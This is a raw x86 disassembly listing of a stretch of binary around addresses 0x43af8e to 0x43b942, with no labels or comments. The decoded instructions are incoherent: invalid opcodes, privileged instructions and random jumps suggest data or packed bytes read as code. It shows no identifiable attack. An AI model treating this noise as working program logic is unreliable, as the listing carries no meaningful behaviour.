  43af8e:	ds jmp 0x153eac71
  43af94:	and    DWORD PTR [ebp-0xbc402b4],eax
  43af9a:	pop    es
  43af9b:	sub    eax,0x2686fa6a
  43afa1:	std    
  43afa2:	cli    
  43afa3:	hlt    
  43afa4:	sbb    ch,BYTE PTR [ecx+0x74]
  43afa7:	fnop   
  43afa9:	imul   esi,DWORD PTR [ecx+eiz*8+0x0],0x0
	...
  43afc9:	add    BYTE PTR [ebx],ah
  43afcb:	adc    al,0x2c
  43afcd:	cld    
  43afce:	into   
  43afcf:	ins    BYTE PTR es:[edi],dx
  43afd0:	pop    esp
  43afd1:	mov    esp,0xbbfffccc
  43afd6:	xchg   edi,eax
  43afd7:	pop    eax
  43afd8:	icebp  
  43afd9:	in     al,0x2e
  43afdb:	dec    edx
  43afdc:	add    BYTE PTR ds:[esp+ebp*2+0x50],ah
  43afe1:	mov    esp,DWORD PTR [ecx-0x33de8bfc]
  43afe7:	mov    cl,0x16
  43afe9:	add    BYTE PTR [esp+ebp*8-0x46],ah
  43afed:	je     0x43affb
  43afef:	sub    DWORD PTR ds:0xfa410820,esi
  43aff5:	je     0x43b03b
  43aff7:	cmc    
  43aff8:	jae    0x43b00a
  43affa:	scas   eax,DWORD PTR es:[edi]
  43affb:	ss push cs
  43affd:	push   DWORD PTR [ecx+0x28e3e7f8]
  43b003:	cmc    
  43b004:	cmc    
  43b005:	jmp    0x43b04b
  43b007:	cmc    
  43b008:	jae    0x43b01e
  43b00a:	sub    ebp,DWORD PTR [edi+0xa]
  43b00d:	push   esi
  43b00e:	sub    ebp,DWORD PTR [edi+0x2]
  43b011:	inc    DWORD PTR [ecx]
  43b013:	dec    esp
  43b014:	push   cs
  43b015:	inc    eax
  43b016:	hlt    
  43b017:	push   ebp
  43b018:	pop    ebx
  43b019:	ret    0xfff4
  43b01c:	push   esp
  43b01d:	mov    ebx,eax
  43b01f:	fld    QWORD PTR [ebx]
  43b021:	and    BYTE PTR [edx+0x203fa3e],cl
  43b027:	ja     0x43b09c
  43b029:	adc    BYTE PTR [eax],ah
  43b02b:	and    eax,0x6ce8
	...
  43b04c:	or     BYTE PTR [eax+eax*1],al
  43b04f:	test   BYTE PTR [ebx+ebx*2+0x12],dh
  43b053:	cmp    esp,ecx
  43b055:	pop    ds
  43b056:	fadd   QWORD PTR [ebx-0x5c]
  43b059:	jo     0x43b065
  43b05b:	push   DWORD PTR [ecx-0x53b27d05]
  43b061:	bnd jae 0x43b06c
  43b064:	mov    WORD PTR [eax-0x29d4000a],cs
  43b06a:	or     edi,edi
  43b06c:	mov    cl,0x7
  43b06e:	div    DWORD PTR [ebp-0x80]
  43b071:	cmp    eax,0x650d75f5
  43b076:	jno    0x43b0ec
  43b078:	add    eax,0x19500fba
  43b07d:	cdq    
  43b07e:	(bad)  
  43b07f:	pop    ecx
  43b080:	enter  0xb16,0x0
  43b084:	mov    eax,0x10f162dd
  43b089:	stc    
  43b08a:	push   ecx
  43b08b:	ds or  eax,0xc086cc5d
  43b091:	push   0x363520ea
  43b096:	adc    al,BYTE PTR [eax]
  43b098:	or     eax,0x15733ee5
  43b09d:	ds das 
  43b09f:	and    BYTE PTR [ecx-0x6a],cl
  43b0a2:	(bad)  
  43b0a3:	je     0x43b0a2
  43b0a5:	jno    0x43b091
  43b0a7:	adc    eax,DWORD PTR [esi-0x6704e974]
  43b0ad:	jo     0x43b115
  43b0af:	push   ebx
	...
  43b0cc:	add    BYTE PTR [eax],al
  43b0ce:	or     DWORD PTR [edx+0x74],ecx
  43b0d1:	out    0x1e,al
  43b0d3:	push   edx
  43b0d4:	jmp    0xf252:0xfd3fa17
  43b0db:	sub    ecx,DWORD PTR [eax]
  43b0dd:	sti    
  43b0de:	pusha  
  43b0df:	jno    0x43b154
  43b0e1:	adc    al,0x1d
  43b0e3:	dec    esp
  43b0e4:	mov    esi,0x3dfc38ff
  43b0e9:	adc    ecx,DWORD PTR ds:0xc3eb892c
  43b0ef:	arpl   WORD PTR [esi],bx
  43b0f1:	fimul  DWORD PTR [esi+0x59]
  43b0f4:	cli    
  43b0f5:	push   ecx
  43b0f6:	xchg   BYTE PTR [ebx],dl
  43b0f8:	or     BYTE PTR [esp+ebp*8-0x70],dh
  43b0fc:	push   ebp
  43b0fd:	push   ss
  43b0fe:	or     eax,0x19bf7a59
  43b103:	push   ecx
  43b104:	aaa    
  43b105:	xor    eax,0xffc07ced
  43b10a:	sbb    DWORD PTR [eax],eax
  43b10c:	stc    
  43b10d:	je     0x43b110
  43b10f:	adc    BYTE PTR [esi-0x39],ch
  43b112:	push   ds
  43b113:	imul   ebx,ebx,0xb
  43b116:	test   BYTE PTR gs:[ebp+esi*2+0x77],0x56
  43b11c:	fdiv   DWORD PTR [ecx+eiz*8+0x13]
  43b120:	cmp    ch,bh
  43b122:	adc    dl,dl
  43b124:	xor    edi,ebp
  43b126:	adc    ch,BYTE PTR [ebx-0x2d]
  43b129:	ret    
  43b12a:	stc    
  43b12b:	mov    edi,0x3de9d5e8
  43b130:	clc    
  43b131:	add    eax,DWORD PTR [eax]
	...
  43b14f:	add    al,bl
  43b151:	jbe    0x43b157
  43b153:	outs   dx,BYTE PTR ds:[esi]
  43b154:	adc    DWORD PTR [eax],esp
  43b156:	sub    eax,ecx
  43b158:	xor    bh,dh
  43b15a:	call   0x3522:0x74fba188
  43b161:	xchg   ebx,eax
  43b162:	int    0x3
  43b164:	or     eax,0xfaf02884
  43b169:	es sbb al,0x24
  43b16c:	jmp    0x13329a2e
  43b171:	imul   ebx,DWORD PTR [ebx+0x14],0x74f4bb92
  43b178:	jns    0x43b172
  43b17a:	sar    BYTE PTR [esi],1
  43b17c:	jecxz  0x43b1e7
  43b17e:	mov    ecx,0x3b691268
  43b183:	adc    dh,dl
  43b185:	repz fmul st,st(5)
  43b188:	xlat   BYTE PTR ds:[ebx]
  43b189:	repz lock je 0x43b1ae
  43b18d:	loopne 0x43b183
  43b18f:	ret    
  43b190:	ret    0x33cb
  43b193:	inc    edx
  43b194:	or     al,BYTE PTR [eax]
  43b196:	xor    al,0x89
  43b198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b199:	jb     0x43b186
  43b19b:	and    eax,edi
  43b19d:	mov    ebp,0x753cffe8
  43b1a2:	(bad)  
  43b1a3:	sti    
  43b1a4:	(bad)  
  43b1a5:	repz and BYTE PTR [ecx-0x16ffed38],al
  43b1ac:	or     ch,BYTE PTR [ecx+0x33440173]
  43b1b2:	and    BYTE PTR ds:0x0,dh
	...
  43b1d0:	add    BYTE PTR [eax],al
  43b1d2:	dec    ebp
  43b1d3:	imul   esi,DWORD PTR [ebx-0x7],0x7213f3f9
  43b1da:	push   ebx
  43b1db:	adc    ebx,edi
  43b1dd:	mov    ah,0xa
  43b1df:	pop    eax
  43b1e0:	jp     0x43b214
  43b1e2:	loope  0x43b249
  43b1e4:	out    0xda,al
  43b1e6:	fpatan 
  43b1e8:	pop    ss
  43b1e9:	cmp    ecx,DWORD PTR es:0xf5331e52
  43b1f0:	cli    
  43b1f1:	pushf  
  43b1f2:	push   es
  43b1f3:	gs adc al,0xb5
  43b1f6:	add    al,al
  43b1f8:	jmp    DWORD PTR [esi-0x16ec54bd]
  43b1fe:	push   ebx
  43b1ff:	sub    bl,0xff
  43b202:	sbb    BYTE PTR [ecx],cl
  43b204:	fisubr DWORD PTR [edx+0x7252040e]
  43b20a:	add    al,0xf9
  43b20c:	jae    0x43b216
  43b20e:	popa   
  43b20f:	add    al,0x17
  43b211:	jmp    0x56033624
  43b216:	add    DWORD PTR [ecx],esi
  43b218:	xor    eax,0x2a3d09
  43b21d:	xor    al,0xf9
  43b21f:	fs je  0x43b1ff
  43b222:	pop    ebx
  43b223:	mov    esp,0xf4d4ae17
  43b228:	out    0xdf,eax
  43b22a:	cmp    esp,DWORD PTR [esi-0x6]
  43b22d:	xchg   edx,eax
  43b22e:	sbb    ah,BYTE PTR [ebp+0x74]
  43b231:	icebp  
  43b232:	aas    
  43b233:	hlt    
  43b234:	adc    esi,DWORD PTR [edi]
	...
  43b252:	add    BYTE PTR [eax],al
  43b254:	ds hlt 
  43b256:	or     eax,DWORD PTR [eax]
  43b258:	xchg   ebx,eax
  43b259:	data16 add bh,bh
  43b25c:	mov    ecx,0xa4400e34
  43b261:	dec    esi
  43b262:	pop    ebx
  43b263:	ret    0xfcb8
  43b266:	xor    al,BYTE PTR ds:0x40107c
  43b26c:	pop    ecx
  43b26d:	div    BYTE PTR [edi-0x5bdce72]
  43b273:	ret    0xf71f
  43b276:	cmp    edx,DWORD PTR ds:0x674fcb4
  43b27c:	mov    edi,es
  43b27e:	retf   
  43b27f:	inc    edx
  43b280:	shl    DWORD PTR fs:[ecx],0x5
  43b284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b285:	pop    es
  43b286:	inc    eax
  43b287:	add    BYTE PTR [ecx-0xcc7480a],ch
  43b28d:	inc    ecx
  43b28e:	cli    
  43b28f:	ret    0xf74f
  43b292:	pop    edi
  43b293:	adc    al,0x64
  43b295:	cld    
  43b296:	out    dx,al
  43b297:	fsubr  DWORD PTR [edi]
  43b299:	mov    esp,0x6e49d0ed
  43b29e:	lds    eax,FWORD PTR [edx+0x24]
  43b2a1:	rcl    DWORD PTR [ebx-0x75],0x10
  43b2a5:	and    esi,0x1ff8ea28
  43b2ab:	fidiv  WORD PTR [edi]
  43b2ad:	cld    
  43b2ae:	add    edx,DWORD PTR [esi+0x6f]
  43b2b1:	push   0xcbf27402
  43b2b6:	jnp    0x43b2d2
	...
  43b2d4:	add    BYTE PTR [eax],al
  43b2d6:	hlt    
  43b2d7:	add    eax,DWORD PTR [eax+eax*8-0x97ae6e8]
  43b2de:	sbb    BYTE PTR ds:0xcbe84683,bl
  43b2e4:	xchg   esi,eax
  43b2e5:	push   DWORD PTR [ebx-0xe]
  43b2e8:	add    eax,0x18
  43b2eb:	or     DWORD PTR [edx+0x28],esp
  43b2ee:	or     eax,0xd54c8127
  43b2f3:	sub    BYTE PTR [eax+ebp*2+0x5d],bl
  43b2f7:	jle    0x43b366
  43b2f9:	mov    BYTE PTR [eax-0x7b],cl
  43b2fc:	jg     0x43b342
  43b2fe:	mov    ch,0x9
  43b300:	pop    ebx
  43b301:	add    BYTE PTR [ebx],bh
  43b303:	(bad)  
  43b304:	pop    ss
  43b305:	pop    esp
  43b306:	and    DWORD PTR [ecx+0x1b5459fe],ebx
  43b30c:	add    eax,DWORD PTR [eax]
  43b30e:	loopne 0x43b2f1
  43b310:	pop    edx
  43b311:	jle    0x43b374
  43b313:	add    DWORD PTR [esi+0x4],esi
  43b316:	sub    eax,0xeffc21f
  43b31b:	(bad)  
  43b31c:	jns    0x43b392
  43b31e:	add    eax,0x1de820a5
  43b323:	push   ebx
  43b324:	(bad)  
  43b325:	call   DWORD PTR [ecx-0x77db0ce7]
  43b32b:	psllq  mm4,QWORD PTR [eax]
  43b32e:	xchg   BYTE PTR [edi-0xa3d17fe],dl
  43b334:	ins    DWORD PTR es:[edi],dx
  43b335:	cli    
  43b336:	nop
  43b337:	sbb    ebx,esi
  43b339:	adc    al,0x0
	...
  43b357:	add    BYTE PTR [edi-0x377327b0],dh
  43b35d:	adc    ah,dl
  43b35f:	out    0xf1,eax
  43b361:	sub    BYTE PTR [esi-0x6],ch
  43b364:	xchg   esp,eax
  43b365:	adc    edx,DWORD PTR [eax-0x74]
  43b368:	dec    eax
  43b369:	inc    ecx
  43b36a:	shl    esi,cl
  43b36c:	or     al,0x27
  43b36e:	jno    0x43b384
  43b370:	inc    ecx
  43b371:	ins    DWORD PTR es:[edi],dx
  43b372:	mov    esi,0x41b048ff
  43b377:	add    ecx,DWORD PTR ds:0x8eeb7d0c
  43b37d:	cmp    al,0x33
  43b37f:	repnz or cl,bh
  43b382:	dec    ebp
  43b383:	ds or  eax,0x8bd9ed00
  43b389:	in     al,dx
  43b38a:	lock imul ebx
  43b38d:	push   edi
  43b38e:	test   DWORD PTR [ebx],ecx
  43b390:	or     eax,0x1e446500
  43b395:	sbb    ch,BYTE PTR [edx+edi*2+0x1e]
  43b399:	push   ds
  43b39a:	data16 xor bl,ch
  43b39d:	in     al,dx
  43b39e:	(bad)  
  43b39f:	jl     0x43b3ed
  43b3a1:	clc    
  43b3a2:	sub    BYTE PTR [edi-0x7c],0x66
  43b3a6:	popa   
  43b3a7:	xchg   edx,eax
  43b3a9:	jmp    0x43b39e
  43b3ab:	(bad)  [edx]
  43b3ad:	into   
  43b3ae:	arpl   WORD PTR [edi+0x3e40d042],di
  43b3b4:	mov    bh,0x66
  43b3b6:	inc    ecx
  43b3b7:	jnp    0x43b382
  43b3b9:	inc    edi
  43b3ba:	imul   eax,edi,0x0
	...
  43b3d9:	add    BYTE PTR [edx-0x31],cl
  43b3dc:	cmp    eax,0xd366bf03
  43b3e1:	sub    esp,DWORD PTR [eax]
  43b3e3:	shr    al,0xd1
  43b3e6:	push   ebp
  43b3e7:	inc    ecx
  43b3e8:	in     al,0x3
  43b3ea:	loopne 0x43b466
  43b3ec:	add    al,0x85
  43b3ee:	es das 
  43b3f0:	adc    eax,DWORD PTR [edi]
  43b3f2:	in     eax,dx
  43b3f3:	inc    ebp
  43b3f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b3f5:	add    ecx,DWORD PTR [ecx]
  43b3f7:	into   
  43b3f8:	ins    DWORD PTR es:[edi],dx
  43b3f9:	not    DWORD PTR [edx]
  43b3fb:	in     al,dx
  43b3fc:	mov    ch,0x5b
  43b3fe:	jge    0x43b408
  43b400:	jmp    0x5c844508
  43b405:	push   ds
  43b406:	mov    BYTE PTR [esi+0x54],ch
  43b409:	sub    bh,BYTE PTR [edx+0x26]
  43b40c:	sbb    edi,esi
  43b40e:	sub    eax,0xf2fc2279
  43b413:	cdq    
  43b414:	ret    0xe770
  43b417:	jnp    0x43b3c1
  43b419:	test   DWORD PTR [ecx],0xb4f8ffda
  43b41f:	je     0x43b46d
  43b421:	cdq    
  43b422:	fistp  WORD PTR [ebp+0x77]
  43b425:	push   esi
  43b426:	cmp    eax,0x4924886a
  43b42b:	je     0x43b471
  43b42d:	mov    ecx,0x37005ede
  43b432:	sbb    al,0xc
  43b434:	sub    ah,bl
  43b436:	into   
  43b437:	gs pop esp
  43b439:	mov    al,0x50
  43b43b:	add    DWORD PTR [eax],eax
  43b43d:	sbb    al,0x0
	...
  43b45b:	add    BYTE PTR [eax],dl
  43b45d:	pop    ecx
  43b45e:	dec    esi
  43b45f:	push   ss
  43b460:	or     BYTE PTR [edi],bh
  43b462:	out    0xdf,eax
  43b464:	push   cs
  43b465:	add    BYTE PTR [eax],al
  43b467:	push   ecx
  43b468:	pop    es
  43b469:	cld    
  43b46a:	(bad)  
  43b46b:	call   0xba9201a9
  43b470:	inc    ecx
  43b471:	push   0x74
  43b473:	fabs   
  43b475:	ins    BYTE PTR es:[edi],dx
  43b476:	push   edx
  43b477:	add    edx,DWORD PTR ds:[esp+edx*1-0x772ef157]
  43b47f:	out    0xe6,eax
  43b481:	arpl   WORD PTR [ecx+0x1a27bd26],bp
  43b487:	xchg   esp,eax
  43b488:	adc    dl,BYTE PTR [esi]
  43b48a:	rol    BYTE PTR [edx],0x70
  43b48d:	stos   BYTE PTR es:[edi],al
  43b48e:	add    edi,DWORD PTR [ecx-0x533e9ab2]
  43b494:	(bad)  
  43b495:	sti    
  43b496:	(bad)  
  43b497:	call   0x644792aa
  43b49c:	inc    ebp
  43b49d:	add    DWORD PTR [eax-0x12],edx
  43b4a0:	inc    edx
  43b4a1:	imul   esi,DWORD PTR [ecx],0x147424e6
  43b4a7:	sub    DWORD PTR [ecx],edx
  43b4a9:	in     eax,0xc2
  43b4ab:	loope  0x43b510
  43b4ad:	mov    ah,0xf
  43b4af:	push   esp
  43b4b0:	dec    ecx
  43b4b1:	mov    dh,0x4e
  43b4b3:	add    BYTE PTR [esi],bh
  43b4b5:	add    DWORD PTR [ebx+0x53],ecx
  43b4b8:	fwait
  43b4b9:	pushw  es
  43b4bb:	call   DWORD PTR [ecx]
  43b4bd:	fs cmc 
  43b4bf:	add    BYTE PTR ss:[eax],al
	...
  43b4de:	jnp    0x43b4e6
  43b4e0:	les    edx,FWORD PTR ds:0x4688fbf4
  43b4e6:	mov    al,0x19
  43b4e8:	mov    ebx,0xc0e9ad75
  43b4ed:	call   0x43b5a0
  43b4f2:	jg     0x43b49b
  43b4f4:	stos   BYTE PTR es:[edi],al
  43b4f5:	add    ebx,edi
  43b4f7:	cmp    BYTE PTR [ebx-0x3e],bl
  43b4fa:	test   al,0x0
  43b4fc:	dec    esi
  43b4fd:	push   edi
  43b4fe:	out    dx,eax
  43b4ff:	jmp    0x43b4e3
  43b501:	and    esi,DWORD PTR [eax+eax*1+0x0]
  43b505:	mov    esi,DWORD PTR [edx-0x73c27d04]
  43b50b:	push   es
  43b50c:	inc    eax
  43b50d:	add    cl,dh
  43b50f:	mov    ebx,0xd584076e
  43b514:	int    0x83
  43b516:	push   edx
  43b517:	cld    
  43b518:	dec    DWORD PTR [edx+0x74ba7762]
  43b51e:	xor    dl,BYTE PTR [eax-0xb]
  43b521:	xlat   BYTE PTR ds:[ebx]
  43b522:	mov    bh,0x1d
  43b524:	add    BYTE PTR [edi+0x7a],bl
  43b527:	rol    DWORD PTR [ecx-0x4588d3ba],0x74
  43b52e:	das    
  43b52f:	push   eax
  43b530:	cmc    
  43b531:	adc    eax,0x4006bc
  43b536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b537:	pop    ebp
  43b538:	add    al,BYTE PTR [eax]
  43b53a:	out    0x46,eax
  43b53c:	sub    esp,0x112e075
	...
  43b55e:	add    BYTE PTR [eax],al
  43b560:	hlt    
  43b561:	dec    DWORD PTR [edx+0x56]
  43b564:	jge    0x43b59e
  43b566:	test   BYTE PTR [ebx-0x2904bf3],0x43
  43b56d:	fidiv  WORD PTR [ebx-0x4a]
  43b570:	or     eax,0x6183fa3a
  43b575:	pop    esp
  43b576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b577:	call   ebx
  43b579:	sbb    eax,0x2d11a788
  43b57e:	add    al,BYTE PTR [ecx+0x7ffe59d6]
  43b584:	or     eax,0x4d7166c2
  43b589:	pop    ecx
  43b58a:	xchg   esi,eax
  43b58b:	add    BYTE PTR [eax],ah
  43b58d:	pop    esp
  43b58e:	test   eax,0x4191bff
  43b593:	call   0xfaad9802
  43b598:	daa    
  43b599:	pop    ecx
  43b59a:	int    0x67
  43b59c:	push   ebp
  43b59d:	call   0xebd6:0x58f4ffbd
  43b5a4:	add    ebx,DWORD PTR [ecx+0x60f8fafe]
  43b5aa:	sar    edx,1
  43b5ac:	jecxz  0x43b60a
  43b5ae:	imul   edx,DWORD PTR [eiz*4-0x7a0041bc],0x4d84f69b
  43b5b9:	pop    edx
  43b5ba:	xor    al,0xd
  43b5bd:	pop    ecx
  43b5be:	(bad)  
  43b5bf:	gs or  esp,ebp
  43b5c2:	mov    edi,0x7
	...
  43b5df:	add    BYTE PTR [eax],al
  43b5e1:	add    ah,bl
  43b5e3:	mov    ?,WORD PTR [edi-0x96bb5b1]
  43b5e9:	add    BYTE PTR ds:0xf8fafe59,cl
  43b5ef:	in     al,dx
  43b5f0:	pop    ss
  43b5f1:	inc    eax
  43b5f2:	or     eax,0x12ec1511
  43b5f7:	push   0x78
  43b5f9:	cmp    al,0xc1
  43b5fb:	dec    ebx
  43b5fc:	mov    esi,0xe8ffc7ff
  43b601:	add    ecx,DWORD PTR ds:0x78081ca0
  43b607:	cmc    
  43b608:	rol    dh,0xf6
  43b60b:	(bad)  
  43b60c:	leave  
  43b60d:	mov    BYTE PTR [edx-0x2578930e],ah
  43b613:	(bad)  
  43b614:	call   0x193bff97
  43b619:	jg     0x43b5ac
  43b61b:	push   0xcfc76daa
  43b620:	test   eax,0xe80012c7
  43b625:	add    ecx,DWORD PTR ds:0x1bdbfb63
  43b62b:	shr    al,0x86
  43b62e:	(bad)  
  43b62f:	in     al,dx
  43b630:	shrd   DWORD PTR [edi-0x2bfc1701],edx,0xbc
  43b638:	loopne 0x43b636
  43b63a:	dec    eax
  43b63b:	mov    ebp,0xfc8e45e0
  43b640:	pop    edi
  43b641:	outs   dx,BYTE PTR ds:[esi]
  43b642:	ja     0x43b6a6
  43b644:	call   0x43b6c7
	...
  43b661:	add    BYTE PTR [eax],al
  43b663:	add    BYTE PTR [ecx+0x676d5268],cl
  43b669:	iret   
  43b66a:	dec    ecx
  43b66b:	pop    ss
  43b66c:	dec    ecx
  43b66d:	or     eax,0xbc8403a9
  43b672:	lock xchg BYTE PTR [edx+0x1dd9a7eb],dl
  43b679:	jne    0x43b6de
  43b67b:	pop    esp
  43b67c:	inc    esp
  43b67d:	bound  esp,QWORD PTR [ecx]
  43b67f:	fcomp  QWORD PTR [edx]
  43b681:	jb     0x43b62b
  43b683:	add    ebx,ebp
  43b685:	(bad)  
  43b686:	sti    
  43b687:	mov    edi,0x78e8bffc
  43b68c:	leave  
  43b68d:	mul    DWORD PTR [ebp+0x48]
  43b690:	push   es
  43b691:	fcom   DWORD PTR [edx+ebp*8+0x63ffffd2]
  43b698:	xchg   ebp,eax
  43b699:	cld    
  43b69a:	clc    
  43b69b:	out    dx,eax
  43b69c:	jno    0x43b704
  43b69e:	dec    edi
  43b69f:	out    0x23,al
  43b6a1:	clc    
  43b6a2:	adc    BYTE PTR [ecx],ch
  43b6a4:	or     DWORD PTR [ecx+0x44],edi
  43b6a7:	loope  0x43b666
  43b6a9:	loop   0x43b66a
  43b6ab:	cli    
  43b6ac:	mov    esi,0x68d18474
  43b6b1:	data16 cli 
  43b6b3:	sbb    DWORD PTR [eax-0x11],esp
  43b6b6:	pop    es
  43b6b7:	mov    dh,0x61
  43b6b9:	loop   0x43b737
  43b6bb:	lods   eax,DWORD PTR ds:[esi]
  43b6bc:	push   cs
  43b6bd:	jmp    0x43b6cc
  43b6bf:	cmp    dl,bh
  43b6c1:	repnz addr16 aad 0x30
  43b6c5:	and    DWORD PTR [eax],eax
  43b6c7:	xchg   esi,eax
	...
  43b6e4:	add    BYTE PTR [eax],al
  43b6e6:	mov    al,ds:0x8db6faf9
  43b6eb:	imul   eax,DWORD PTR [eax],0xc01106fc
  43b6f1:	sbb    DWORD PTR [ecx-0x7f89b04f],edi
  43b6f7:	stc    
  43b6f8:	cli    
  43b6f9:	aam    0xbe
  43b6fb:	or     al,0x40
  43b6fd:	jmp    0xd444208f
  43b702:	or     bh,BYTE PTR [edx-0x41]
  43b705:	inc    edx
  43b706:	adc    DWORD PTR [eax-0x6e],ebx
  43b709:	dec    edi
  43b70a:	icebp  
  43b70b:	gs sub eax,0x56c74929
  43b711:	xor    ah,cl
  43b713:	cld    
  43b714:	call   FWORD PTR [ebx-0x67afab3b]
  43b71a:	pop    ebp
  43b71b:	iret   
  43b71c:	xchg   BYTE PTR [ecx],bl
  43b71e:	popa   
  43b71f:	jl     0x43b712
  43b721:	xchg   ebp,eax
  43b722:	xor    bl,bl
  43b724:	pop    es
  43b725:	or     DWORD PTR [esi],0xffffffce
  43b728:	cli    
  43b729:	hlt    
  43b72a:	cmovo  eax,DWORD PTR ds:[eax]
  43b72e:	and    al,0x80
  43b730:	mov    esi,0xf259a70c
  43b735:	add    BYTE PTR [ebx-0x3],al
  43b738:	(bad)  
  43b73a:	hlt    
  43b73b:	dec    ebx
  43b73c:	loop   0x43b6fa
  43b73e:	mov    al,ds:0xcc8bf5d4
  43b743:	jle    0x43b716
  43b745:	vmread eax,ebp
  43b748:	cli    
  43b749:	inc    DWORD PTR [eax]
	...
  43b767:	add    ah,dh
  43b769:	jns    0x43b7e6
  43b76b:	or     al,0xe4
  43b76d:	push   eax
  43b76e:	or     al,0x6a
  43b770:	in     al,0xd5
  43b772:	jae    0x43b780
  43b774:	or     DWORD PTR [esi],0x1c
  43b777:	adc    esi,esp
  43b779:	sti    
  43b77a:	cmp    al,0x2
  43b77c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b77d:	cld    
  43b77e:	push   DWORD PTR [edi+eax*1-0x19]
  43b782:	inc    ebx
  43b783:	cld    
  43b784:	in     al,0xe0
  43b786:	inc    ebx
  43b787:	or     bl,bl
  43b789:	dec    eax
  43b78a:	cmc    
  43b78b:	jo     0x43b729
  43b78d:	jecxz  0x43b80a
  43b78f:	cld    
  43b790:	adc    ecx,DWORD PTR [edi]
  43b792:	nop
  43b793:	adc    eax,0xc084fc34
  43b798:	js     0x43b73c
  43b79a:	add    DWORD PTR [ebp-0x10],0x2d74ba7e
  43b7a1:	sti    
  43b7a2:	inc    esp
  43b7a3:	clc    
  43b7a4:	cmc    
  43b7a5:	push   esi
  43b7a6:	repnz retf 0xfc40
  43b7aa:	push   DWORD PTR [esi+0x5b]
  43b7ad:	jg     0x43b79f
  43b7af:	je     0x43b73d
  43b7b1:	loopne 0x43b7fb
  43b7b3:	add    al,0x37
  43b7b5:	and    al,0xe3
  43b7b7:	mov    esi,0x84f5d48f
  43b7bc:	in     al,0x6f
  43b7be:	and    edi,edi
  43b7c0:	cdq    
  43b7c1:	fadd   DWORD PTR [ecx-0x3fa9f2fa]
  43b7c7:	add    edi,DWORD PTR [esi+0x1465a6]
	...
  43b7e9:	add    cl,cl
  43b7eb:	inc    eax
  43b7ec:	mov    esi,0x629b87ff
  43b7f1:	jle    0x43b7c4
  43b7f3:	add    eax,DWORD PTR gs:[edx+0x9]
  43b7f7:	add    dh,BYTE PTR [edi+0x4e]
  43b7fa:	in     eax,0xc2
  43b7fc:	xchg   edi,eax
  43b7fd:	cli    
  43b7fe:	bnd jns 0x43b804
  43b801:	out    0xfe,eax
  43b803:	sbb    DWORD PTR [eax+edx*2-0x4f],ebx
  43b807:	dec    esi
  43b808:	gs test bl,ah
  43b80b:	sbb    eax,0x311bfaff
  43b810:	shr    BYTE PTR [ebx-0x3fcb6936],0x62
  43b817:	bswap  ebx
  43b819:	enter  0x51cf,0xfe
  43b81d:	push   esp
  43b81e:	xchg   BYTE PTR [ebp+0x1a01eb81],cl
  43b824:	iret   
  43b825:	cs (bad) 
  43b827:	sbb    bl,ah
  43b829:	jg     0x43b838
  43b82b:	imul   edi,esi,0xd9fa0f65
  43b831:	add    ch,dh
  43b833:	push   0xedcdfffe
  43b838:	out    dx,eax
  43b839:	or     eax,DWORD PTR [ebp+0x18fa6544]
  43b83f:	test   eax,0xe20d4014
  43b844:	data16 jle 0x43b8a9
  43b847:	into   
  43b848:	cmc    
  43b849:	cmp    DWORD PTR [eax+0x69],0xfffffffe
  43b84d:	inc    DWORD PTR [eax]
	...
  43b86b:	add    BYTE PTR [ebx+0xd0ffede],bh
  43b871:	imul   edx,eax,0x65822de7
  43b877:	cli    
  43b878:	test   BYTE PTR [eax],al
  43b87a:	lods   al,BYTE PTR ds:[esi]
  43b87b:	outs   dx,DWORD PTR ds:[esi]
  43b87c:	sti    
  43b87d:	inc    edx
  43b87e:	xchg   esp,eax
  43b87f:	lock xchg ebp,eax
  43b881:	mov    ebp,0xefc02c10
  43b886:	xchg   esp,eax
  43b887:	adc    al,0xca
  43b889:	pop    esi
  43b88a:	jnp    0x43b89f
  43b88c:	push   ss
  43b88d:	cmc    
  43b88e:	fcom   QWORD PTR [esi]
  43b890:	dec    ebp
  43b891:	add    BYTE PTR [ebp+eax*1-0xf16fff4],dh
  43b898:	pop    esi
  43b899:	lea    ebp,[ebx]
  43b89b:	je     0x43b8df
  43b89d:	mov    esp,DWORD PTR [ebx]
  43b89f:	cld    
  43b8a0:	cmp    al,0x5f
  43b8a2:	pop    ebx
  43b8a3:	jo     0x43b88c
  43b8a5:	iret   
  43b8a6:	loopne 0x43b910
  43b8a8:	add    DWORD PTR [eax-0x25],esi
  43b8ab:	ret    
  43b8ac:	rol    BYTE PTR [ebx-0x74f90f58],cl
  43b8b2:	sub    esi,DWORD PTR [ebx+edi*8+0x42]
  43b8b6:	xor    al,0x1e
  43b8b8:	or     al,0xc5
  43b8ba:	mov    al,ds:0xe8583183
  43b8bf:	add    ebp,DWORD PTR [ebp-0x1]
  43b8c2:	sbb    DWORD PTR [ebx],ebx
  43b8c4:	push   edx
  43b8c5:	lea    ebx,[ebx]
  43b8c7:	pop    eax
  43b8c8:	cmp    eax,0x9eef81b0
  43b8cd:	mov    dh,0x79
  43b8cf:	sldt   WORD PTR [eax]
	...
  43b8ee:	fyl2x  
  43b8f0:	sub    BYTE PTR [eax+ecx*4],al
  43b8f3:	aas    
  43b8f4:	hlt    
  43b8f5:	push   cs
  43b8f6:	xchg   edx,eax
  43b8f7:	les    ebx,FWORD PTR [eax+0x2d]
  43b8fa:	enter  0xd46b,0xa4
  43b8fe:	jae    0x43b90a
  43b900:	mov    edx,0xf71bf968
  43b905:	ret    
  43b906:	pop    edx
  43b907:	inc    esp
  43b908:	stos   DWORD PTR es:[edi],eax
  43b909:	push   0x6fb35f0d
  43b90e:	xor    al,BYTE PTR [ebx+0x59b481ff]
  43b914:	push   edx
  43b915:	or     al,BYTE PTR cs:[edi+ecx*1]
  43b919:	test   eax,0xbc37ba0e
  43b91e:	mov    ch,0xd3
  43b920:	pop    es
  43b921:	push   ss
  43b922:	xor    cl,BYTE PTR [edx]
  43b924:	call   0xfa9c0d34
  43b929:	jae    0x43b97d
  43b92b:	pop    ecx
  43b92c:	pop    edx
  43b92d:	mov    ds:0xe90b9b47,al
  43b932:	rol    DWORD PTR [esi-0xaaa9515],cl
  43b938:	dec    esi
  43b939:	aas    
  43b93a:	fcomp  QWORD PTR [edx+0x74]
  43b93d:	in     eax,dx
  43b93e:	arpl   sp,dx
  43b940:	jmp    0x43b903
  43b942:	xchg   ebx,eax
